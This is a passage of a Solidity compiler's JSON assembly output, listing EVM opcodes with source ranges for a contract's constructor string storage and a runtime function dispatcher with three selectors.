									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DIV",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "MSTORE",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "KECCAK256",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "1F"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DIV",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP3",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "1F"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "LT",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "27"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPI",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "FF"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "NOT",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP4",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "OR",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP6",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SSTORE",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "26"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "27"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "1"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP6",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SSTORE",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ISZERO",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "26"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPI",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "28"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "GT",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ISZERO",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "29"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPI",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SSTORE",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "1"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "28"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "29"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "26"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "30"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "31"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMP",
									"source": 3,
									"value": "[in]"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "30"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMP",
									"source": 3,
									"value": "[out]"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "23"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH #[$]",
									"source": 3,
									"value": "0000000000000000000000000000000000000000000000000000000000000001"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [$]",
									"source": 3,
									"value": "0000000000000000000000000000000000000000000000000000000000000001"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP4",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "CODECOPY",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMP",
									"source": 3,
									"value": "[out]"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "31"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "32"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "33"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "GT",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ISZERO",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "34"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPI",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SSTORE",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "1"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "33"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "34"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "32"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMP",
									"source": 3,
									"value": "[out]"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "tag",
									"source": 3,
									"value": "25"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH #[$]",
									"source": 3,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH [$]",
									"source": 3,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "CODECOPY",
									"source": 3
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 367,
									"end": 17651,
									"name": "RETURN",
									"source": 3
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212206a34b6f2a9e6cbe19fc31e8d74a568d91fdd0be6a6fde71ebecd067cf000234164736f6c63430006060033",
									".code": [
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH",
											"source": 3,
											"value": "80"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "CALLDATASIZE",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "CALLDATALOAD",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH",
											"source": 3,
											"value": "E0"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "SHR",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH",
											"source": 3,
											"value": "A7A1C4D"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "3"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH",
											"source": 3,
											"value": "6C02A931"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH",
											"source": 3,
											"value": "7B61C320"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "5"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "tag",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "CALLDATASIZE",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "STOP",
											"source": 3
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "tag",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 367,
											"end": 17651,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 15951,
											"end": 16076,
											"name": "tag",
											"source": 3,
											"value": "3"
										},
										{
											"begin": 15951,
											"end": 16076,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 15951,
											"end": 16076,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "8"
										},
										{
											"begin": 15951,
											"end": 16076,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "9"
										},
										{
											"begin": 15951,
											"end": 16076,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 15951,
											"end": 16076,
											"name": "tag",
											"source": 3,
											"value": "8"
										},
										{
											"begin": 15951,
											"end": 16076,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 15951,
											"end": 16076,
											"name": "STOP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "tag",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "CALLVALUE",
											"source": 3
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "11"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "12"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "tag",
											"source": 3,
											"value": "11"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "13"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "15"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "13"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "15"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "1F"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "16"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "EXP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "NOT",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "tag",
											"source": 3,
											"value": "16"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "RETURN",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "tag",
											"source": 3,
											"value": "5"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "CALLVALUE",
											"source": 3
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "17"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "17"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "18"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "19"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "tag",
											"source": 3,
											"value": "18"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMPDEST",
